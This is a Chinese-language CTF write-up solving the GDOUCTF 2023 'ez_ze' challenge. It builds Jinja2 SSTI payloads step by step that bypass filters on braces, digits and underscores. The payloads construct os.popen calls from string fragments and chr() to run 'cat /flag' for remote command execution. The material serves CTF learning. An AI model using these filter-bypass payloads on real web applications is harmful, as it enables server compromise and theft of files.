# [GDOUCTF 2023]＜ez_ze＞ SSTI 过滤数字 大括号{等

[SSTI模板注入-中括号、args、下划线、单双引号、os、request、花括号、数字被过滤绕过（ctfshow web入门370）-CSDN博客](https://blog.csdn.net/weixin_52635170/article/details/129856818) 

ssti板块注入

正好不会 {%%}的内容 学习一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/61750a8761347d4fe5a72cc8836ef619.png" alt="" style="max-height:289px; box-sizing:content-box;" />


经过测试 发现过滤了 {{}}

那么我们就开始吧

我们可以通过这个语句来查询是否存在ssti

```crystal
{%if 条件%}result{%endif%}
 
 
解释一下 如果条件里为真 就输出 result 否则不输出
 
修改一下
{%if not a%}yes{%endif%}
 
第二种
 
{%print 123%}
 
通过输出123来判断
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0f753d632db83f46d0c5b6c21f14cb3e.png" alt="" style="max-height:184px; box-sizing:content-box;" />


存在咯

这里跟着师傅的wp走 他那边过滤了数字 我们也来看看

## 获取数字

```cobol
{%set one=dict(c=a)|join|count%}{%set two=dict(cc=a)|join|count%}{%set three=dict(ccc=a)|join|count%}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/56d281043c05385994d2afd21623f533.png" alt="" style="max-height:470px; box-sizing:content-box;" />


这里就可以获取数字

但是这道题不需要

然后我们首先确定一下我们需要的payload

```lisp
(lipsum|attr("__globals__").get("os").popen("cat /flag").read()
```



这个时候我们需要获取_通过lipsum|string|list

这个时候可以通过 pop方法

## 获取_

### 先需要获取pop

```perl
pop方法可以根据索引值来删除列中的某个元素并将该元素返回值返回。
```

```perl
{%set pop=dict(pop=a)|join%}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c769ad8f88c89b80e5fe54c97fc45521.png" alt="" style="max-height:297px; box-sizing:content-box;" />


```cobol
{%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)%}{%print xiahuaxian%}
 
然后我们数 可以发现 _ 在24 所以我们索引即可
 
{%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}{%print xiahuaxian%}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/20fb8e85dc23a72f18f9cd6fdf0d264a.png" alt="" style="max-height:610px; box-sizing:content-box;" />


成功获取

## 然后获取golbals

```cobol
name={%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%print globals%}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7754e946f3c2bc43c8fad1f4f058bf3a.png" alt="" style="max-height:698px; box-sizing:content-box;" />


## 获取os

### 首先需要获取get

```cobol
{%set get=dict(get=a)|join%}{%print get%}
```

然后

然后我们可以获取os

```cobol
{%set shell=dict(o=a,s=b)|join%}{%print shell%}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b3082a09ccc92888d46fed595c580e4f.png" alt="" style="max-height:387px; box-sizing:content-box;" />


## 获取popen

```perl
{%set popen=dict(pop=a,en=b)|join%}{%print popen%}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/96f500b9ca0a7db341c6e2ffb9b6f653.png" alt="" style="max-height:459px; box-sizing:content-box;" />
过滤了 改名字就可以了

```cobol
{%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%set pp=dict(po=a,pen=b)|join%}
{%print lipsum|attr(globals)|attr(get)(shell)|attr(pp)%}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c91c731a750b4ee55c9061b57c6741ef.png" alt="" style="max-height:710px; box-sizing:content-box;" />


成功获取咯

## 获取chr

### 首先要获取__builtins__

```cobol
 
{%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%set pp=dict(po=a,pen=b)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%print builtins%}
```

获取chr

```cobol
 
{%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%set pp=dict(po=a,pen=b)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
{%print char%}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d324c353acb22522348c97745c8e0e4e.png" alt="" style="max-height:703px; box-sizing:content-box;" />


成功

然后就是通过char拼接命令

```cobol
?name={%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set%20get=dict(get=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
{%set command=char(five*five*four-one)%2bchar(five*five*four-three)%2bchar(four*five*six-four)%2bchar(four*eight)%2bchar(six*eight-one)%2bchar(three*six*six-six)%2bchar(three*six*six)%2bchar(five*five*four-three)%2bchar(three*six*six-five)%}
{%print command%}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5bd63be598a913773ad110b4e12974a6.png" alt="" style="max-height:696px; box-sizing:content-box;" />


然后就是获取read

## 获取read

```cobol
name={%set read=dict(read=a)|join%}{%print read%}
```

最后就是拼接执行命令

```cobol
name={%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%set pp=dict(po=a,pen=b)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
{%set command=char(five*five*four-one)%2bchar(five*five*four-three)%2bchar(four*five*six-four)%2bchar(four*eight)%2bchar(six*eight-one)%2bchar(three*six*six-six)%2bchar(three*six*six)%2bchar(five*five*four-three)%2bchar(three*six*six-five)%}
{%set read=dict(read=a)|join%}{%print (lipsum|attr(globals))|attr(get)(shell)|attr(pp)(command)|attr(read)()%}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a7177755d76efc475ad57a9cf08fd83f.png" alt="" style="max-height:706px; box-sizing:content-box;" />


确实学到了 但是这个太麻烦了 这个是很极端的我们这道题没有过滤这么多

## 正常来

```objectivec
{% set pop=dict(pop=1)|join %}   
 
{% set kong=(lipsum|string|list)|attr(pop)(9) %}
 
{% set xhx=(lipsum|string|list)|attr(pop)(18) %}
 
{% set re=(config|string|list)|attr(pop)(239) %}
 
{% set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %}
 
{% set geti=(xhx,xhx,dict(get=a,item=b)|join,xhx,xhx)|join %}
 
{% set o=dict(o=a,s=b)|join %}
 
{% set po=dict(pop=a,en=b)|join %}
 
{% set cmd=(dict(cat=a)|join,kong,re,dict(flag=a)|join)|join %}
 
{% set read=dict(read=a)|join %}
 
{% print(lipsum|attr(globals)|attr(geti)(o)|attr(po)(cmd)|attr(read)()) %}
 
这里原型是
 
lipsum.__globals__.getitem[os].popen(cat flag).read()
 
类似于这种
```

真是一个恐怖的ssti